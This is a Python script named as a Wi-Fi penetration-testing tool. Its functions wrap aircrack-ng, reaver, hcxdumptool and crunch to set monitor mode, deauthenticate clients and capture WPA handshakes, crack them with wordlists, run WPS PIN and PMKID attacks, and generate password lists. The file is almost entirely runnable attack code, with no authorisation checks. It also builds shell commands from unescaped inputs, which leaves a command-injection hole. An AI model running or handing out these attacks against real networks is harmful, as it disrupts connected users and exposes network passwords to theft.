### --- wifi_pentest.py ---
import os
import time
import subprocess
import logging

logging.basicConfig(filename="wifi_pentest.log", level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

interface = None

def install_tools():
    """Install necessary tools."""
    cmd = "apt-get update && apt-get install xterm aircrack-ng hcxtools hcxdumptool crunch reaver -y"
    logging.info(f"Installing tools with: {cmd}")
    subprocess.run(cmd, shell=True, check=True)

def set_monitor_mode(interface_name="wlan0"):
    """Start monitor mode on the specified interface."""
    global interface
    interface = interface_name
    subprocess.run("airmon-ng check kill", shell=True)
    subprocess.run(f"airmon-ng start {interface}", shell=True)
    logging.info(f"Monitor mode started on {interface}")
    return f"{interface} set to monitor mode."

def stop_monitor_mode():
    """Stop monitor mode on the current interface."""
    global interface
    if interface is None:
        raise ValueError("Monitor mode is not started yet.")
    subprocess.run(["airmon-ng", "stop", interface])
    logging.info(f"Monitor mode stopped on {interface}")
    interface = None
    return "Monitor mode stopped."

def scan_networks():
    """Scan for networks using airodump-ng in a new terminal window."""
    if interface is None:
        raise ValueError("Monitor mode is not started yet.")
    logging.info(f"Scanning networks with: airodump-ng {interface} in new terminal")
    cmd = f"xterm -hold -e 'airodump-ng {interface}'"
    subprocess.Popen(cmd, shell=True)

def capture_handshake(bssid, channel):
    """Capture WPA handshake."""
    if interface is None:
        raise ValueError("Monitor mode is not started yet.")
    handshake_path = os.path.join(os.getcwd(), f"handshake.cap")
    logging.info(f"Capturing handshake for BSSID {bssid} on channel {channel}")
    cmd = f"xterm -e airodump-ng --bssid {bssid} -c {channel} --write handshake {interface} & xterm -e aireplay-ng --deauth 1000 -a {bssid} {interface}"
    subprocess.run(cmd, shell=True)
    return handshake_path

def crack_handshake(handshake_path, wordlist_path):
    """Crack WPA handshake using a wordlist."""
    if not os.path.exists(handshake_path):
        raise FileNotFoundError("Handshake file not found.")
    if not os.path.exists(wordlist_path):
        raise FileNotFoundError("Wordlist file not found.")
    logging.info(f"Cracking handshake at {handshake_path} using wordlist {wordlist_path}")
    subprocess.run(f"xterm -hold -e aircrack-ng {handshake_path} -w {wordlist_path}", shell=True)

def perform_wps_attack(bssid, channel):
    """Perform a WPS attack using Reaver."""
    if interface is None:
        raise ValueError("Monitor mode is not started yet.")
    subprocess.run(["iwconfig", interface, "channel", channel])
    cmd = f"xterm -hold -e reaver -i {interface} -b {bssid} -c {channel} -vv -K 1"
    logging.info(f"Running WPS attack with: {cmd}")
    try:
        subprocess.run(cmd, shell=True, timeout=180)
    except subprocess.TimeoutExpired:
        logging.warning("Unable to find password.")

def perform_pmkid_attack(bssid, channel):
    """Perform a PMKID attack."""
    if interface is None:
        raise ValueError("Monitor mode is not started yet.")
    subprocess.run(["iwconfig", interface, "channel", channel])
    pmkid_path = os.path.join(os.getcwd(), "pmkid.pcapng")
    cmd = f"xterm -e hcxdumptool -i {interface} --enable_status=1 -o {pmkid_path} --filterlist_ap={bssid} --filtermode=2"
    logging.info(f"Running PMKID attack with: {cmd}")
    subprocess.run(cmd, shell=True)
    return pmkid_path

def create_password_list(characters, length, pattern, output_path):
    """Create a custom password list using Crunch."""
    if pattern:
        cmd = f"xterm -e crunch {length} {length} {characters} -t {pattern} -o {output_path}"
    else:
        cmd = f"xterm -e crunch {length} {length} {characters} -o {output_path}"
    logging.info(f"Generating password list with: {cmd}")
    subprocess.run(cmd, shell=True)
    return output_path
